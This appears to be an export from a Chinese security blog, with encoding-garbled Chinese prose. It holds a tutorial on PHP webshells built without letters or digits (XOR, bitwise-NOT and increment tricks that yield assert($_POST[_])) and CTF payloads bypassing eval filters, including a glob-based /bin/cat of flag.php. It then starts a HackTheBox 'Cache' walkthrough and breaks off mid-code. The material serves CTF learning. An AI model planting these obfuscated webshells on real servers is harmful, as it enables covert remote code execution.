<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_++;</span><br><span class="line">print($_); &#x2F;&#x2F; 1</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>phpä¸­æœªå®šä¹‰çš„å˜é‡é»˜è®¤å€¼ä¸ºnullï¼Œnullfalse0</p>
</blockquote>
<h2 id="0x03-æ— æ•°å­—å­—æ¯æ„é€ webshell">0x03 æ— æ•°å­—å­—æ¯æ„é€ webshell</h2>
<p>ä»£ç </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; demo2.php</span><br><span class="line">&lt;?php</span><br><span class="line">if(!preg_match(&#39;&#x2F;[a-z0-9]&#x2F;is&#39;,$_GET[&#39;shell&#39;])) &#123;</span><br><span class="line">  eval($_GET[&#39;shell&#39;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ€è·¯</p>
<p>å°†éå­—æ¯ã€æ•°å­—çš„å­—ç¬¦ç»è¿‡å„ç§å˜æ¢ï¼Œæœ€åèƒ½æ„é€ å‡ºa-zä¸­ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚ç„¶åå†åˆ©ç”¨PHPå…è®¸åŠ¨æ€å‡½æ•°æ‰§è¡Œçš„ç‰¹ç‚¹ï¼Œæ‹¼æ¥å¤„ä¸€ä¸ªå‡½æ•°åï¼Œå¦‚&quot;assert&quot;ï¼Œç„¶ååŠ¨æ€æ‰§è¡Œå³å¯ã€‚</p>
<blockquote>
<p>ä½¿ç”¨assertçš„è¯PHPç‰ˆæœ¬å¿…é¡»å°äºç­‰äº7.0</p>
</blockquote>
<h3 id="åˆ©ç”¨å¼‚æˆ–æ“ä½œ">åˆ©ç”¨å¼‚æˆ–æ“ä½œ</h3>
<p>ä¸å¯æ‰“å°å­—ç¬¦ï¼Œç”¨urlç¼–ç è¡¨ç¤ºã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_&#x3D;(&#39;%01&#39;^&#39;&#96;&#39;).(&#39;%13&#39;^&#39;&#96;&#39;).(&#39;%13&#39;^&#39;&#96;&#39;).(&#39;%05&#39;^&#39;&#96;&#39;).(&#39;%12&#39;^&#39;&#96;&#39;).(&#39;%14&#39;^&#39;&#96;&#39;); &#x2F;&#x2F; $_&#x3D;&#39;assert&#39;;</span><br><span class="line">$__&#x3D;&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;&#96;&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;); &#x2F;&#x2F; $__&#x3D;&#39;_POST&#39;;</span><br><span class="line">$___&#x3D;$$__;</span><br><span class="line">$_($___[_]); &#x2F;&#x2F; assert($_POST[_]);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>æŸ¥asciiç å¯¹ç…§è¡¨å¯ä»¥å‘ç°ï¼Œ0x01 = 1 = SOH; 0x13 = 19 = DC3; 0x05 = 5 = ENQç­‰ç­‰</p>
</blockquote>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200510200554.png" alt="img"></p>
<p>å¦‚æœè¦ç›´æ¥ä½¿ç”¨çš„è¯ï¼Œå¿…é¡»å¯¹è¿™äº›ä¸å¯æ‰“å°çš„ç‰¹æ®Šå­—ç¬¦urlç¼–ç ï¼Œå®é™…ä¸Šæœ¨é©¬åº”è¯¥æ˜¯ä¸‹é¢è¿™ä¸ªæ ·å­ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_&#x3D;(urldecode(&#39;%01&#39;)^&#39;&#96;&#39;).(urldecode(&#39;%13&#39;)^&#39;&#96;&#39;).(urldecode(&#39;%13&#39;)^&#39;&#96;&#39;).(urldecode(&#39;%05&#39;)^&#39;&#96;&#39;).(urldecode(&#39;%12&#39;)^&#39;&#96;&#39;).(urldecode(&#39;%14&#39;)^&#39;&#96;&#39;);</span><br><span class="line">$__&#x3D;&#39;_&#39;.(urldecode(&#39;%0D&#39;)^&#39;]&#39;).(urldecode(&#39;%2F&#39;)^&#39;&#96;&#39;).(urldecode(&#39;%0E&#39;)^&#39;]&#39;).(urldecode(&#39;%09&#39;)^&#39;]&#39;);</span><br><span class="line">$___&#x3D;$$__;</span><br><span class="line">$_($___[_]);&#x2F;&#x2F; assert($_POST[_]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200510200142.png" alt="img"></p>
<h3 id="åˆ©ç”¨å–åæ“ä½œ">åˆ©ç”¨å–åæ“ä½œ</h3>
<p>åˆ©ç”¨çš„æ˜¯UTF-8ç¼–ç çš„æŸä¸ªæ±‰å­—ï¼Œå°†å…¶ä¸­çš„æŸä¸ªå­—ç¬¦å–å‡ºæ¥ï¼Œå–åä¸ºå­—æ¯ã€‚ä¸€ä¸ªæ±‰å­—çš„utf8æ˜¯ä¸‰ä¸ªå­—èŠ‚ï¼Œ{2}è¡¨ç¤ºç¬¬3ä¸ªå­—èŠ‚ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type:text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">$__&#x3D;(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);&#x2F;&#x2F;$__&#x3D;2</span><br><span class="line">$_&#x3D;$__&#x2F;$__;&#x2F;&#x2F;$_&#x3D;1</span><br><span class="line">$___&#x3D;&quot;ç°&quot;;</span><br><span class="line">$____&#x3D;&quot;å’Œ&quot;;</span><br><span class="line">print(~($___&#123;$_&#125;)); &#x2F;&#x2F; a</span><br><span class="line">print(~($____&#123;$__&#125;)); &#x2F;&#x2F; s</span><br></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$__&#x3D;(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);&#x2F;&#x2F;$__2</span><br><span class="line">$_&#x3D;$__&#x2F;$__;&#x2F;&#x2F;$_1</span><br><span class="line"></span><br><span class="line">$____&#x3D;&#39;&#39;;</span><br><span class="line">$___&#x3D;&quot;ç°&quot;;$____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;å’Œ&quot;;$____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;å’Œ&quot;;$____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;çš„&quot;;$____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;åŠ&quot;;$____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;å§‹&quot;;$____.&#x3D;~($___&#123;$__&#125;);&#x2F;&#x2F;$____&#x3D;assert</span><br><span class="line"></span><br><span class="line">$_____&#x3D;&#39;_&#39;;$___&#x3D;&quot;ä¿¯&quot;;$_____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;ç°&quot;;$_____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;æ¬¡&quot;;$_____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;ç«™&quot;;$_____.&#x3D;~($___&#123;$_&#125;);&#x2F;&#x2F;$_____&#x3D;_POST</span><br><span class="line"></span><br><span class="line">$_&#x3D;$$_____;&#x2F;&#x2F;$_&#x3D;$_POST</span><br><span class="line">$____($_[$__]);&#x2F;&#x2F;assert($_POST[2])</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200510205730.png" alt="img"></p>
<p>è¿™é‡Œä¹Ÿæœ‰ä¸€ç§ç®€çŸ­çš„å†™æ³•<code>$&#123;~&quot;\xa0\xb8\xba\xab&quot;&#125;</code>å®ƒç­‰äº$_GETã€‚è¿™é‡Œç›¸å½“äºç›´æ¥æŠŠutf8ç¼–ç çš„æŸä¸ªå­—èŠ‚æå–å‡ºæ¥ç»Ÿä¸€è¿›è¡Œå–åã€‚</p>
<h3 id="åˆ©ç”¨é€’å¢æ“ä½œç¬¦">åˆ©ç”¨é€’å¢æ“ä½œç¬¦</h3>
<p>æˆ‘ä»¬åªè¦èƒ½æ‹¿åˆ°ä¸€ä¸ªå˜é‡ï¼Œå…¶å€¼ä¸ºaï¼Œé€šè¿‡è‡ªå¢æ“ä½œå³å¯è·å¾—a-zä¸­æ‰€æœ‰å­—ç¬¦ã€‚<br>
æ•°ç»„ï¼ˆArrayï¼‰çš„ç¬¬ä¸€ä¸ªå­—æ¯å°±æ˜¯å¤§å†™Aï¼Œè€Œä¸”ç¬¬4ä¸ªå­—æ¯æ˜¯å°å†™aã€‚åœ¨PHPä¸­ï¼Œå¦‚æœå¼ºåˆ¶è¿æ¥æ•°ç»„å’Œå­—ç¬¦ä¸²çš„è¯ï¼Œæ•°ç»„å°†è¢«è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå…¶å€¼ä¸ºArrayã€‚å†å–è¿™ä¸ªå­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—æ¯ï¼Œå°±å¯ä»¥è·å¾—â€™Aâ€™ã€‚</p>
<blockquote>
<p>å› ä¸ºPHPå‡½æ•°æ˜¯å¤§å°å†™ä¸æ•æ„Ÿçš„ï¼Œæœ€ç»ˆæ‰§è¡Œçš„æ˜¯ASSERT($POST[])ï¼Œæ— éœ€è·å–å°å†™aã€‚</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_&#x3D;[];</span><br><span class="line">$_&#x3D;@&quot;$_&quot;; &#x2F;&#x2F; $_&#x3D;&#39;Array&#39;;</span><br><span class="line">$_&#x3D;$_[&#39;!&#39;&#x3D;&#x3D;&#39;@&#39;]; &#x2F;&#x2F; $_&#x3D;$_[0];</span><br><span class="line">$___&#x3D;$_; &#x2F;&#x2F; A</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.&#x3D;$__; &#x2F;&#x2F; S</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++; &#x2F;&#x2F; E </span><br><span class="line">$___.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; R</span><br><span class="line">$___.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T</span><br><span class="line">$___.&#x3D;$__;</span><br><span class="line"></span><br><span class="line">$____&#x3D;&#39;_&#39;;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; P</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; O</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; S</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line">$__&#x3D;$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T</span><br><span class="line">$____.&#x3D;$__;</span><br><span class="line"></span><br><span class="line">$_&#x3D;$$____;</span><br><span class="line">$___($_[_]); &#x2F;&#x2F; ASSERT($_POST[_]);</span><br></pre></td></tr></table></figure>
<h2 id="0x04-å›åˆ°æœ€å¼€å§‹çš„é‚£é“é¢˜">0x04 å›åˆ°æœ€å¼€å§‹çš„é‚£é“é¢˜</h2>
<h3 id="å¼‚æˆ–æ–¹æ³•">å¼‚æˆ–æ–¹æ³•</h3>
<p>å‰é¢æåˆ°è¿‡<code>_GET</code>ä¹Ÿå¯ä»¥è¿™æ ·æ‹¼æ¥ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$__&#x3D;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;; &#x2F;&#x2F; $__&#x3D;&quot;_GET&quot;;</span><br></pre></td></tr></table></figure>
<p>æŒ‰ç…§è¿™ç§æ–¹æ³•ï¼Œå¯ä»¥å¾—åˆ°ä¸€ç§payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;$_&#x3D;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;;$&#123;$_&#125;[_]();&amp;_&#x3D;getFlag</span><br></pre></td></tr></table></figure>
<p>å³<code>$&#123;$_&#125;[_]()</code> = <code>$_GET[_]()</code>ï¼Œurlä¼ å…¥<code>_=getFlag</code></p>
<blockquote>
<p>æœ¬æ–‡çš„åé¢è§£é‡Šäº†<code>$&#123;$_&#125;[_]()</code>ä¸­çš„<code>&#123;&#125;</code>çš„ä½œç”¨</p>
</blockquote>
<p>è¿˜æœ‰ä¸¤ç§æ›´ç›´æ¥çš„payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;$_&#x3D;&#39;[[]|@[[&#39;^&#39;&lt;&gt;):,:&lt;&#39;;$_();    &#x2F;&#x2F;$_&#x3D;&#39;getFlag&#39;</span><br><span class="line">?code&#x3D;$å•Š&#x3D;(%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27);$å•Š();</span><br></pre></td></tr></table></figure>
<p>ç›¸å½“äº <code>$å•Š=getFlag;$å•Š();</code></p>
<h3 id="å–åæ–¹æ³•">å–åæ–¹æ³•</h3>
<p>å‰é¢ä¹Ÿæåˆ°è¿‡<code>$_GET</code>è¿˜æœ‰ä¸€ç§ç®€çŸ­çš„å†™æ³•<code>$&#123;~&quot;\xa0\xb8\xba\xab&quot;&#125;</code></p>
<p>é‚£ä¹ˆåˆ©ç”¨è¿™ç§æ–¹å¼å¯å¾—payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;$_&#x3D;~%98%9A%8B%B9%93%9E%98;$_(); &#x2F;&#x2F;%_ä¸ºgetFlagå–åç„¶åURLç¼–ç å¾—ç»“æœ</span><br></pre></td></tr></table></figure>
<p>æˆ–</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa&#x3D;getFlag</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­ï¼š<code>%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B</code> = <code>$_GET['+']</code></p>
<h2 id="0x05-è¿›ä¸€æ­¥æ€è€ƒ">0x05 è¿›ä¸€æ­¥æ€è€ƒ</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;code&#39;]))&#123;</span><br><span class="line">    $code &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">    if(strlen($code)&gt;50)&#123;</span><br><span class="line">        die(&quot;Too Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;&#x2F;[A-Za-z0-9_]+&#x2F;&quot;,$code))&#123;</span><br><span class="line">        die(&quot;Not Allowed.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;$hint &#x3D;  &quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>åœ¨ä¸Šé¢ä¸€é“é¢˜çš„åŸºç¡€ä¸Šï¼Œåˆè¿‡æ»¤äº†ä¸‹åˆ’çº¿<code>_</code>ï¼Œæ„å‘³ç€ä¸èƒ½å®šä¹‰å˜é‡ï¼Œè€Œä¸”ä¹Ÿæ„é€ ä¸å‡ºæ¥æ•°å­—ã€‚</p>
<p>é¦–å…ˆçœ‹ä¸€ä¸ªé”™è¯¯çš„payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;(&#39;$&#39;).(&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;).([&#39;+&#39;])&amp;+&#x3D;getFlag();</span><br></pre></td></tr></table></figure>
<p>é”™è¯¯çš„åŸå› æ˜¯<strong>evalåªèƒ½è§£æä¸€éä»£ç ï¼Œæ‰€ä»¥å¦‚æœå†™çš„æ˜¯a.bè¿™æ ·çš„å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œå°±åªä¼šæ‰§è¡Œè¿™ä¸ªæ‹¼æ¥ï¼Œå¹¶ä¸ä¼šå»æ‰§è¡Œä»£ç </strong>ã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<p><code>eval($_GET['b'])</code> urlé‡Œé¢ <code>b=phpinfo();</code> è¿™æ—¶å€™ç›¸å½“äº<code>eval('phpinfo();')</code><br>
<code>eval($_GET['b'])</code> urlé‡Œé¢<code>b=$_GET[c]&amp;c=phpinfo();</code> ç›¸å½“äº<code>eval('$_GET[c]')</code><br>
ä¸Šé¢çš„payloadæ˜¯<code>code=$_GET['+']&amp;+=getFlag();</code> ï¼Œä¹Ÿå°±æ˜¯<code>eval('$_GET['+'])</code>å¹¶ä¸ä¼šæ‰§è¡Œ<code>getFlag();</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;12354&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="string">&quot;getflag&quot;</span>;</span><br><span class="line">$b=<span class="string">&quot;()&quot;</span>;</span><br><span class="line">@<span class="keyword">eval</span>($a.$b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªä»£ç ä¸ä¼šè¾“å‡ºä»»ä½•ç»“æœã€‚</p>
<p>æ­£ç¡®çš„payloadä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;$&#123;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;&#125;[&#39;+&#39;]();&amp;+&#x3D;getFlag</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œåˆ©ç”¨äº†<code>$&#123;&#125;</code>ä¸­çš„ä»£ç æ˜¯å¯ä»¥æ‰§è¡Œçš„ç‰¹ç‚¹ï¼Œå…¶å®ä¹Ÿå°±æ˜¯å¯å˜å˜é‡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $a &#x3D; &#39;hello&#39;;</span><br><span class="line">    $$a &#x3D; &#39;world&#39;;</span><br><span class="line">    echo &quot;$a $&#123;$a&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>è¾“å‡º<code>hello world</code>ï¼Œ<code>$&#123;$a&#125;</code>ï¼Œæ‹¬å·ä¸­çš„<code>$a</code>æ˜¯å¯ä»¥æ‰§è¡Œçš„ï¼Œå˜æˆäº†helloã€‚</p>
<blockquote>
<p>è¿™ä¹Ÿè§£é‡Šä¸Šé¢æåˆ°çš„ä¸ºä»€ä¹ˆè¦åŠ ä¸Š<code>&#123;&#125;</code></p>
</blockquote>
<p>è¿˜å¯ä»¥ä½¿ç”¨å–åçš„æ–¹æ³•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa&#x3D;getFlag</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­<code>24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B</code> = <code>$&#123;~&quot;\xa0\xb8\xba\xab&quot;&#125;</code> = <code>$_GET</code></p>
<blockquote>
<p>~åœ¨{}ä¸­æ‰§è¡Œäº†å–åæ“ä½œ</p>
</blockquote>
<p>å¦å¤–ä¸Šé¢æåˆ°è¿‡çš„ä¸€ä¸ªpayloadä»ç„¶è¿˜æ˜¯å¯ä»¥ä½¿ç”¨ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">code&#x3D;$å•Š&#x3D;(%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27);$å•Š();</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œå°±ä¸éœ€è¦ç”¨{}äº†ï¼Œå› ä¸ºå¼‚æˆ–çš„å€¼ç›´æ¥è¢«å½“ä½œå­—ç¬¦ä¸²èµ‹å€¼ç»™äº†$å•Šã€‚</p>
<h2 id="0x06-æœ€åçš„æ€è€ƒ">0x06 æœ€åçš„æ€è€ƒ</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">if(isset($_GET[&#39;code&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    $code&#x3D;$_GET[&#39;code&#39;];</span><br><span class="line">    if(strlen($code)&gt;35)&#123;</span><br><span class="line">    die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;&#x2F;[A-Za-z0-9_$]+&#x2F;&quot;,$code))</span><br><span class="line">    &#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;$hint&#x3D;&quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>è¿™é“é¢˜è¿›ä¸€æ­¥çš„è¿‡æ»¤äº†<code>$</code>å­—ç¬¦ã€‚</p>
<p>Payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">code&#x3D;?&gt;&lt;?&#x3D;&#96;&#x2F;???&#x2F;??? ????.???&#96;?&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>å‰ææ˜¯åœ¨Linuxç³»ç»Ÿä¸­</p>
</blockquote>
<p>é¦–å…ˆ<code>?&gt;</code>é—­åˆphpæ–‡ä»¶å¼€å¤´çš„<code>&lt;?php</code>ï¼Œ<code>&lt;?=</code>å¯ä»¥è¾“å‡ºã€‚</p>
<p><code>&lt;? ?&gt;</code>æ˜¯çŸ­æ ‡ç­¾ï¼Œ<code>&lt;?php ?&gt;</code>æ˜¯é•¿æ ‡ç­¾ã€‚åœ¨phpçš„é…ç½®æ–‡ä»¶<code>php.ini</code>ä¸­æœ‰ä¸€ä¸ª<code>short_open_tag</code>çš„å€¼ï¼Œå¼€å¯ä»¥åå¯ä»¥ä½¿ç”¨PHPçš„çŸ­æ ‡ç­¾ï¼š<code>&lt;? ?&gt;</code>åŒæ—¶ï¼Œåªæœ‰å¼€å¯è¿™ä¸ªæ‰å¯ä»¥ä½¿ç”¨ <code>&lt;?=&gt;</code>ä»¥ä»£æ›¿ <code>&lt;? echo</code> ã€‚</p>
<p>å¦å¤–ï¼Œåœ¨linuxç³»ç»Ÿä¸­ï¼Œæ˜¯æ”¯æŒæ­£åˆ™çš„ï¼ŒæŸäº›ä½ å¿˜è®°æŸä¸ªå­—ç¬¦æƒ…å†µä¸‹ï¼Œä½ å¯ä»¥ä½¿ç”¨<code>? * %</code>ç­‰å­—ç¬¦æ¥æ›¿ä»£ï¼Œå½“ç„¶è¿™é‡Œæƒ³è¦æ‰§è¡Œå‘½ä»¤ï¼Œéœ€è¦æé™çš„åˆ©ç”¨è¿™ä¸ªæ–¹æ³•ï¼Œç»è¿‡æµ‹è¯•ï¼š</p>
<p><code>/???/???</code>é€šé…``/bin/cat<code>ï¼Œ</code>???.???<code>é€šé…</code>flag.php`</p>
<h2 id="0x07-Reference">0x07 Reference</h2>
<p><a href="https://www.moonback.xyz/2019/10/16/nowords-webshell/">https://www.moonback.xyz/2019/10/16/nowords-webshell/</a></p>
<p>[phpä¸ä½¿ç”¨æ•°å­—å­—æ¯å’Œä¸‹åˆ’çº¿å†™shell](</p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
        <category>åŸºç¡€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>webå®‰å…¨åŸºç¡€</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::Cache Walkthrough</title>
    <url>/Target_drone/HackTheBox/19.HackTheBox-Cache-walkthrough/</url>
    <content><![CDATA[<h1 id="HTB-Cache-Walkthrough">HTB::Cache Walkthrough</h1>
<h2 id="0x01-Info-Card">0x01 Info Card</h2>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200526163301.png" style="zoom:80%;" />
<h2 id="0x02-Tools-and-Tips">0x02 Tools and Tips</h2>
<ul>
<li>nmap</li>
<li>cewl</li>
<li>wfuzz</li>
<li>sqlmap</li>
<li>openEMR exploit</li>
<li>memcached exploit</li>
<li>docker priv</li>
</ul>
<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
<h3 id="Initial-Enumeration">Initial Enumeration</h3>
<h4 id="nmapæ‰«æ">nmapæ‰«æ</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.80 scan initiated Wed May 20 16:58:59 2020 as: nmap -sC -sV -Pn -oN ippsec_scan.txt 10.10.10.188</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.188</span><br><span class="line">Host is up (0.29s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)</span><br><span class="line">|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)</span><br><span class="line">|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Cache</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Wed May 20 17:00:01 2020 -- 1 IP address (1 host up) scanned in 61.63 seconds</span></span><br></pre></td></tr></table></figure>
<h4 id="80ç«¯å£">80ç«¯å£</h4>
<p>ä¸»é¡µæ²¡æœ‰ä»€ä¹ˆæœ‰æ•ˆä¿¡æ¯ï¼Œå°è¯•æš´åŠ›ç ´è§£ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200528101145.png" alt=""></p>
<p>é¡µé¢åŠ è½½äº†<code>functionality.js</code>ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> error_correctPassword = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">var</span> error_username = <span class="literal">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkCorrectPassword</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> Password = $(<span class="string">&quot;#password&quot;</span>).val();</span><br><span class="line">        <span class="keyword">if</span>(Password != <span class="string">&#x27;H@v3_fun&#x27;</span>)&#123;</span><br><span class="line">            alert(<span class="string">&quot;Password didn&#x27;t Match&quot;</span>);</span><br><span class="line">            error_correctPassword = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkCorrectUsername</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    